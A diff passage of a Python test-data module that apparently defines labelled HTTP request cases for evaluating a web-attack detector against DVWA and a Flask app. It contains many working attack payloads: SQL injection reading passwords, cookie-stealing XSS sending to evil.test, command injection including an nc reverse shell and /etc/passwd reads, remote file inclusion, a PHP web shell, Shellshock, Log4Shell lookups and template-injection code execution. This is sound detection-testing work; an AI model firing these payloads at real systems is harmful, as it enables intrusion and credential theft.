+    ("sqli", "blind-sleep", "sqli_blind", "query", "id", "1' AND SLEEP(5)#"),
+    ("sqli", "blind-substring", "sqli_blind", "query", "id", "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64#"),
+    ("sqli", "blind-benchmark", "sqli_blind", "query", "id", "1' AND BENCHMARK(5000000,MD5(1))#"),
+    ("sqli", "login-comment", "login", "form", "username", "admin'#"),
+    ("sqli", "login-or", "login", "form", "password", "x' OR '1'='1"),
+    ("sqli", "brute-username-or", "brute", "query", "username", "admin' OR '1'='1'#"),
+    ("sqli", "security-level-or", "security", "form", "security", "low' OR 1=1--"),
+    ("xss", "xss-r-script", "xss_r", "query", "name", "<script>alert(document.cookie)</script>"),
+    ("xss", "xss-r-img", "xss_r", "query", "name", "<img src=x onerror=alert(1)>"),
+    ("xss", "xss-r-svg", "xss_r", "query", "name", "\"><svg onload=alert(document.domain)>"),
+    ("xss", "xss-d-script", "xss_d", "query", "default", "English<script>alert(1)</script>"),
+    ("xss", "guestbook-script", "xss_s", "form", "mtxMessage", "<script>new Image().src='//evil.test/?c='+document.cookie</script>"),
+    ("xss", "guestbook-iframe", "xss_s", "form", "mtxMessage", "<iframe src=javascript:alert(1)>"),
+    ("xss", "guestbook-name-body-onload", "xss_s", "form", "txtName", "<body onload=alert(1)>"),
+    ("rce", "exec-semicolon-id", "exec", "form", "ip", "127.0.0.1; id"),
+    ("rce", "exec-pipe-passwd", "exec", "form", "ip", "127.0.0.1 | cat /etc/passwd"),
+    ("rce", "exec-and-whoami", "exec", "form", "ip", "127.0.0.1 && whoami"),
+    ("rce", "exec-subshell", "exec", "form", "ip", "$(uname -a)"),
+    ("rce", "exec-nc-reverse", "exec", "form", "ip", "127.0.0.1; nc -e /bin/sh 10.0.0.1 4444"),
+    ("rce", "exec-ifs", "exec", "form", "ip", "127.0.0.1;cat${IFS}/etc/passwd"),
+    ("lfi", "fi-traversal", "fi", "query", "page", "../../../../../etc/passwd"),
+    ("lfi", "fi-php-filter", "fi", "query", "page", "php://filter/convert.base64-encode/resource=../../config/config.inc.php"),
+    ("lfi", "fi-proc-environ", "fi", "query", "page", "/proc/self/environ"),
+    ("rfi", "fi-remote", "fi", "query", "page", "http://evil.test/shell.txt?"),
+    ("php", "fi-data-wrapper", "fi", "query", "page", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="),
+    ("php", "instructions-doc-traversal", "instructions", "query", "doc", "../../../../etc/passwd"),
+    ("php", "guestbook-php-tag", "xss_s", "form", "mtxMessage", "<?php system($_GET['c']); ?>"),
+    ("scanner", "ua-nikto", "home", "header", "User-Agent", "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"),
+    ("rce", "ua-shellshock", "home", "header", "User-Agent", "() { :; }; /bin/bash -c 'id'"),
+    ("sqli", "ua-union", "home", "header", "User-Agent", "Mozilla/5.0' UNION SELECT user,password FROM users#"),
+    ("xss", "referer-script", "sqli", "header", "Referer", "http://localhost/\"><script>alert(1)</script>"),
+    ("sqli", "cookie-security-or", "sqli", "cookie", "security", "low' OR 1=1--"),
+    ("lfi", "cookie-lang-traversal", "home", "cookie", "lang", "../../../../etc/passwd"),
+    ("xss", "cookie-theme-script", "home", "cookie", "theme", "<script>alert(1)</script>"),
+    ("lfi", "path-config-backup", "home", "path", None, "/config/config.inc.php.bak"),
+    ("lfi", "path-git-head", "home", "path", None, "/.git/HEAD"),
+]
+
+# Python/Jinja, Java and Node payloads sent to the PHP app.
+DVWA_WRONG_STACK = [
+    ("ssti", "xss-r-jinja-config", "xss_r", "query", "name", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
+    ("ssti", "xss-r-jinja-probe", "xss_r", "query", "name", "{{7*7}}"),
+    ("ssti", "guestbook-jinja-subclasses", "xss_s", "form", "mtxMessage",
+     "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}"
+     "{{ c()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}"),
+    ("python", "exec-python-import", "exec", "form", "ip", "__import__('os').system('id')"),
+    ("python", "sqli-python-eval", "sqli", "query", "id", "eval(\"__import__('os').popen('id').read()\")"),
+    ("java", "guestbook-java-deser", "xss_s", "form", "mtxMessage", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3I="),
+    ("java", "xss-r-runtime-exec", "xss_r", "query", "name", "java.lang.Runtime.getRuntime().exec(\"id\")"),
+    ("java", "ua-log4shell", "home", "header", "User-Agent", "${jndi:ldap://evil.test:1389/a}"),
+    ("java", "referer-log4shell", "sqli", "header", "Referer", "${jndi:rmi://evil.test/x}"),
+    ("java", "cookie-java-deser", "home", "cookie", "remember_me", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAA"),
+    ("java", "xss-r-ognl", "xss_r", "query", "name", "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}"),
+    ("java", "guestbook-processbuilder", "xss_s", "form", "mtxMessage", "new java.lang.ProcessBuilder(\"id\").start()"),
+    ("node", "guestbook-child-process", "xss_s", "form", "mtxMessage", "require('child_process').exec('id')"),
+    ("ruby", "xss-r-erb", "xss_r", "query", "name", "<%= `id` %>"),
+    ("java", "path-actuator-env", "home", "path", None, "/actuator/env"),
+    ("python", "path-werkzeug-console", "home", "path", None, "/console?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=x"),
+]
+
+
+def request_cases() -> list[RequestCase]:
+    cases = (
+        _rows("flask", FP, FLASK_HARMLESS)
+        + _rows("flask", A, FLASK_ATTACKS)
+        + _rows("flask", A, FLASK_WRONG_STACK, wrong_stack=True)
+        + _rows("dvwa", FP, DVWA_HARMLESS)
+        + _rows("dvwa", A, DVWA_ATTACKS)
+        + _rows("dvwa", A, DVWA_WRONG_STACK, wrong_stack=True)
+    )
+    seen: set[str] = set()
+    for case in cases:
+        if case.id in seen:
+            raise ValueError(f"duplicate request case id: {case.id}")
+        seen.add(case.id)
+    return cases
